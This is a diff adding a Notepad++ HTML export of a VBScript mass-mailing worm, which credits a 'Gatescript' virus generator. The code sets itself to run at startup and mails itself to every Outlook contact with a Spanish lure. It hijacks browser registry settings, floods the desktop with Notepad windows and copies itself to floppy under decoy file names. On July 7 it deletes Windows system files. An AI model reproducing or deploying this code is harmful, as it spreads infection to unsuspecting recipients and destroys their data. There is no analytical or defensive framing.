@@ -1,0 +1,139 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'PetiK
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmcmsgitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmcborritagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmccolitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">zitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmvalitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmsenitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">emmtecitagxg</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">vtecitagxg</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmwshitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmfsoitagxg</span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">emmfsoitagxg.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM"</span><span class="sc6">,</span><span class="sc4">"wscript.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">emmfsoitagxg.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs %"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">wshell.regread</span><span class="sc6">(</span><span class="sc4">"HKCU\software\EMM\correo"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">Outlookemmitagxg</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Outlookemmitagxg</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgApp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmitagxgApp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgapp.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgml</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgM.AddressLists</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">emmitagxgAdl</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">emmitagxgml</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmitagxgAdl.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">emmitagxgAdt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgAdl.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">emmitagxgAddt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">emmitagxgAdt</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgms</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgApp.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgAdts</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgAdl.AddressEntries</span><span class="sc6">(</span><span class="sc7">emmitagxgAddt</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">emmitagxgms.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgAdts.Address</span><span class="sc0">
+</span><span class="sc7">emmitagxgms.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Estimado Bill G."</span><span class="sc0">
+</span><span class="sc7">emmitagxgms.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Aqui le adjunto los precios para su funeraria."</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">emmitagxgAtt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmitagxgms.Attachments</span><span class="sc0">
+</span><span class="sc7">emmitagxgAtt.Add</span><span class="sc0"> </span><span class="sc7">emmfsoitagxg.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc0">
+</span><span class="sc7">emmitagxgms.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmitagxgms.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">emmitagxgms.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKCU\software\EMM\correo"</span><span class="sc6">,</span><span class="sc4">"1"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmwshitagxg.regread</span><span class="sc6">(</span><span class="sc4">"HKCU\software\EMM\mensaje"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKCU\software\EMM\mensaje"</span><span class="sc6">,</span><span class="sc4">"1"</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"geocities.com/gatescript"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.google.fr"</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title"</span><span class="sc6">,</span><span class="sc4">"Infectado con Gatescript"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmwshitagxg.regread</span><span class="sc6">(</span><span class="sc4">"HCU\software\EMM\colgar"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKCU\software\EMM\colgar"</span><span class="sc6">,</span><span class="sc4">"1"</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">zitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.run</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\Windows\notepad.exe"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">month</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">day</span><span class="sc6">(</span><span class="sc7">now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.deletefile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\Windows\System\*.*"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.deletefile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\Windows\*.*"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.deletefile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\command.com"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.deletefile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\autoexec.bat"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">emmvalitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmwshitagxg.regread</span><span class="sc6">(</span><span class="sc4">"HKCU\software\EMM\teclas"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vtecitagxg</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.regwrite</span><span class="sc0"> </span><span class="sc4">"HKCU\software\EMM\teclas"</span><span class="sc6">,</span><span class="sc7">vtecitagxg</span><span class="sc0">
+</span><span class="sc7">diitagxg</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">diitagxg</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0">
+</span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">emmvalitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">emmvalitagxg</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc7">timer</span><span class="sc0">
+</span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"leeme"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"abrime"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"juegos"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"mensaje"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mifoto.jpg"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmdiitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Importante"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"LEEME.TXT"</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmvalitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">900000</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">emmfsoitagxg.copyfile</span><span class="sc0"> </span><span class="sc7">emmfsoitagxg.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\emm.vbs"</span><span class="sc6">,</span><span class="sc4">"a:\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">emmnaritagxg</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".vbs"</span><span class="sc0">
+</span><span class="sc7">emmvalitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">300000</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">emmwshitagxg.regread</span><span class="sc6">(</span><span class="sc4">"HKCU\software\EMM\teclas"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;=</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">emmwshitagxg.sendkeys</span><span class="sc0"> </span><span class="sc4">"www.geocities.com/gatescript"</span><span class="sc0">
+</span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">emmtecitagxg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">Loop</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span><span class="sc1">'Creado con Gatescript [ generador de virus ] www.geocities.com/gatescript
+</span></div></body>
+</html>
